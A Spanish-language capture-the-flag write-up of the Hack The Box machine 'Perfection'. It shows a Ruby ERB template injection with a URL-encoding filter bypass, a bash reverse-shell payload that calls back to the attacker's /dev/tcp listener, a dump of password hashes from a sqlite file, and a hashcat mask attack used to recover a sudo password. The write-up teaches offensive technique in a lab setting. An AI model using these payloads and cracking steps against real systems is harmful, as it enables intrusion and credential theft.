# Perfection

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/494a5790-cadc-4b1a-9d8c-4c352b8910a3)

***
- Source: https://app.hackthebox.com/machines/Perfection
- OS: Linux
- Dificultad: Easy
- IP: 10.10.11.253
- Temas: ``SSTI``, ``Hash cracking``.
***
***

- Realizamos un escaneo de puertos, podemos ver que solo hay dos servicios abiertos:

~~~bash
❯ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV perfection.htb
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-08 15:32 EST
NSE: Loaded 46 scripts for scanning.
Initiating SYN Stealth Scan at 15:32
Scanning perfection.htb (10.10.11.253) [65535 ports]
Discovered open port 22/tcp on 10.10.11.253
Discovered open port 80/tcp on 10.10.11.253
Completed SYN Stealth Scan at 15:33, 19.91s elapsed (65535 total ports)
Initiating Service scan at 15:33
Scanning 2 services on perfection.htb (10.10.11.253)
Completed Service scan at 15:33, 6.56s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.253.
NSE: Starting runlevel 1 (of 2) scan.
Initiating NSE at 15:33
Completed NSE at 15:33, 1.87s elapsed
NSE: Starting runlevel 2 (of 2) scan.
Initiating NSE at 15:33
Completed NSE at 15:33, 1.71s elapsed
Nmap scan report for perfection.htb (10.10.11.253)
Host is up, received user-set (0.19s latency).
Scanned at 2024-03-08 15:32:59 EST for 31s
Not shown: 52936 closed tcp ports (reset), 12597 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 30.37 seconds
           Raw packets sent: 97624 (4.295MB) | Rcvd: 64043 (2.562MB)
~~~

- En el puerto 80 podemos ver una página web:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/32015dc7-6034-4116-b8d1-86a6d33519ca)

- Investigando un poco en la página, encontré un apartado interesante que me llamó la atención, tenemos que llenar los campos de `wheight` de tal forma que llenen un 100% numérico:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/1257b45b-1e37-4866-aa1c-b6b2c318864a)

- Probé varias veces introducir distintos parámetros, al parecer la página genera el contenido dinámicamente:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/fbdb6e99-b9ec-4979-b514-ea37f4491998)

- Intercepté la petición con Burpsuite.
- Intenté varias movidas, al tratarse de contenido generado dinámicamente (controlado por ``Ruby`` a través de ``WEBrick 1.7.0``) intenté con una Server-Side Template Injection con el payload `{7*7}`, pero se presentó un pequeño problema:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/a03df299-eb9d-402e-9a9e-21912ee8a79b)

- Encontré un [articulo para bypassear STTI](https://blog.devops.dev/ssti-bypass-filter-0-9a-z-i-08a5b3b98def) que explica como podemos encodear solo los caracteres especiales de nuestro payload.
- Hay que encodear solo los caracteres especiales, podemos usar [CyberChef](https://gchq.github.io/CyberChef/):

- Payload:

~~~bash
test
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('id') %><%= @b.readline()%>
test
~~~

- Encodeado:

~~~bash
test%0A%3C%25%20require%20%27open3%27%20%25%3E%3C%25%20%40a%2C%40b%2C%40c%2C%40d%3DOpen3%2Epopen3%28%27id%27%29%20%25%3E%3C%25%3D%20%40b%2Ereadline%28%29%25%3E%0Atest
~~~

- Podemos ver que está interpretando nuestro payload:

![image](https://github.com/JoseVazquez101/Writteups/assets/111292579/7219c98e-2211-4a15-a467-372a0563a583)

- Ahora probaremos con este payload para entablar una conexión a través de una revshell:

- Payload:

~~~ruby
test
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('bash -c "bash -i >& /dev/tcp/10.10.16.50/4444 0>&1"') %><%= @b.readline()%>
test
~~~

- Encodeado:

~~~bash
test%0A%3C%25%20require%20%27open3%27%20%25%3E%3C%25%20%40a%2C%40b%2C%40c%2C%40d%3DOpen3%2Epopen3%28%27bash%20%2Dc%20%22bash%20%2Di%20%3E%26%20%2Fdev%2Ftcp%2F10%2E10%2E16%2E50%2F4444%200%3E%261%22%27%29%20%25%3E%3C%25%3D%20%40b%2Ereadline%28%29%25%3E%0Atest
~~~

- Y si todo ha salido bien, deberíamos recibir una conexión al ponernos en escucha:

~~~bash
❯ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.50] from (UNKNOWN) [10.10.11.253] 54342
bash: cannot set terminal process group (995): Inappropriate ioctl for device
bash: no job control in this shell
susan@perfection:~/ruby_app$ id
id
uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)
~~~

- Realizamos un tratamiento de la TTY:

~~~bash
script /dev/null -c bash
^Z
stty size
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
stty rows 44 columns 184
~~~

***

### PrivEsc

- Ahora bien, podemos ver que estamos en el grupo sudo, pero no tenemos ninguna contraseña:

~~~bash
susan@perfection:~/ruby_app$ id
uid=1001(susan) gid=1001(susan) groups=1001(susan),27(sudo)
susan@perfection:~/ruby_app$ sudo -l
[sudo] password for susan:
~~~

- Por lo que debemos buscar algo que posea alguna contraseña, ya sea una base de datos, una backup, etc.
- Busqué en el directorio del usuario y encontré varios directorios, entre ellos uno llamado `Migrations`, dentro había una base de datos:

~~~bash
susan@perfection:~$ ls -la
total 892
drwxr-x--- 7 susan susan   4096 Mar  8 07:01 .
drwxr-xr-x 3 root  root    4096 Oct 27 10:36 ..
lrwxrwxrwx 1 root  root       9 Feb 28  2023 .bash_history -> /dev/null
-rw-r--r-- 1 susan susan    220 Feb 27  2023 .bash_logout
-rw-r--r-- 1 susan susan   3771 Feb 27  2023 .bashrc
drwx------ 2 susan susan   4096 Oct 27 10:36 .cache
drwx------ 3 susan susan   4096 Mar  8 15:47 .gnupg
lrwxrwxrwx 1 root  root       9 Feb 28  2023 .lesshst -> /dev/null
drwxrwxr-x 3 susan susan   4096 Oct 27 10:36 .local
drwxr-xr-x 2 root  root    4096 Oct 27 10:36 Migration
-rw-r--r-- 1 susan susan    807 Feb 27  2023 .profile
lrwxrwxrwx 1 root  root       9 Feb 28  2023 .python_history -> /dev/null
drwxr-xr-x 4 root  susan   4096 Oct 27 10:36 ruby_app
lrwxrwxrwx 1 root  root       9 May 14  2023 .sqlite_history -> /dev/null
-rw-r--r-- 1 susan susan      0 Oct 27 06:41 .sudo_as_admin_successful
-rw-r----- 1 root  susan     33 Mar  8 05:02 user.txt
-rw-r--r-- 1 susan susan     39 Oct 17 12:26 .vimrc
susan@perfection:~$ cd Migration/
susan@perfection:~/Migration$ ls
pupilpath_credentials.db
~~~

- Tenemos `sqlite3`, así que podemos revisarlo directamente desde aquí:

~~~bash
susan@perfection:~/Migration$ which sqlite3
/usr/bin/sqlite3
~~~

- Vemos varios hashes:

~~~bash
susan@perfection:~/Migration$ sqlite3 pupilpath_credentials.db 
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite> .tables
users
sqlite> select * from users;
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
~~~

- En realidad solo necesitamos la contraseña de `susan`.
- Intenté romper el hash con `jhon`, `hashcat` o incluso páginas como `CrackStation` pero no obtuve nada.
- Encontré una nota que decía esto:

~~~bash
susan@perfection:/var/mail$ cat susan 
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students

in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
~~~

- Tenemos una contraseña que tiene un formato así:
	- firstname = susan
	- firstname_backwards = nasus
	- + número random entre 1 y 1,000,000

- Nos quedaría algo como `susan_nasus_numero`.

##### Hash Cracking:

- Encontré este articulo, que es el que usaremos para basarnos, es propio de hashcat así que debe servir: https://hashcat.net/wiki/doku.php?id=mask_attack

- El articulo nos dice que para efectuar un `mask attack` debemos tomar en cuenta que en este tipo de ataque, para cada posición de los candidatos a contraseña generados necesitamos configurar un marcador de posición. Si una contraseña que queremos descifrar tiene una longitud de 9, nuestra máscara debe constar de 9 marcadores de posición.
- Para esto, debemos buscar los valores de sustitución que toma hashcat, un `d?` es igual a un dígito entero del 0 al 9, por lo que requeriremos 9 de estos en la posición donde se sustituirán los números, nos quedará algo como `susan_nasus_?d?d?d?d?d?d?d?d?d`.
- Para este tipo de ataque, debemos seleccionar el tipo 3, que se hará con el parámetro `-a 3`.
- Por otro lado, tendremos que proporcionar también el hash original de susan, que es `abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f`.
- Con hashcat podemos ver que este es de tipo `SHA256`:

~~~bash
❯ hashcat --identify hash
The following 8 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
   1400 | SHA2-256                                                   | Raw Hash
  17400 | SHA3-256                                                   | Raw Hash
  11700 | GOST R 34.11-2012 (Streebog) 256-bit, big-endian           | Raw Hash
   6900 | GOST R 34.11-94                                            | Raw Hash
  17800 | Keccak-256                                                 | Raw Hash
   1470 | sha256(utf16le($pass))                                     | Raw Hash
  20800 | sha256(md5($pass))                                         | Raw Hash salted and/or iterated
  21400 | sha256(sha256_bin($pass))                                  | Raw Hash salted and/or iterated
~~~

- Ahora bien, para esto, crearemos dos archivos, un `susan.txt`, con el formato que tendrá la contraseña con los números:

~~~bash
❯ cat susan.txt
susan_nasus_?d?d?d?d?d?d?d?d?d
~~~

- Y un archivo `hash` que contendrá el hash de la contraseña en la base de datos:

~~~bash
❯ cat hash
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
~~~

- Y usaremos hashcat para obtener la contraseña con las variantes de números correctas:

~~~bash
❯ hashcat -m 1400 -a 3 hash susan.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 7 5800HS with Radeon Graphics, 3198/6460 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Brute-Force
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit => s

abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1400 (SHA2-256)
Hash.Target......: abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a3019934...39023f
Time.Started.....: Fri Mar  8 17:40:09 2024 (2 mins, 32 secs)
Time.Estimated...: Fri Mar  8 17:42:41 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Mask.......: susan_nasus_?d?d?d?d?d?d?d?d?d [21]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2061.9 kH/s (0.40ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 324558848/1000000000 (32.46%)
Rejected.........: 0/324558848 (0.00%)
Restore.Point....: 324556800/1000000000 (32.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: susan_nasus_126824210 -> susan_nasus_803824210
Hardware.Mon.#1..: Util: 54%

Started: Fri Mar  8 17:40:06 2024
Stopped: Fri Mar  8 17:42:42 2024
~~~

- Y tenemos una credencial `susan_nasus_413759210`.

- Ahora podemos ver que somos capaces de ejecutar cualquier comando como root:

~~~bash
susan@perfection:~$ sudo -l
[sudo] password for susan: 
Matching Defaults entries for susan on perfection:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User susan may run the following commands on perfection:
    (ALL : ALL) ALL
~~~

- Ejecutamos una bash y habríamos completado la máquina:

~~~bash
susan@perfection:~$ sudo bash
root@perfection:/home/susan# id
uid=0(root) gid=0(root) groups=0(root)
~~~
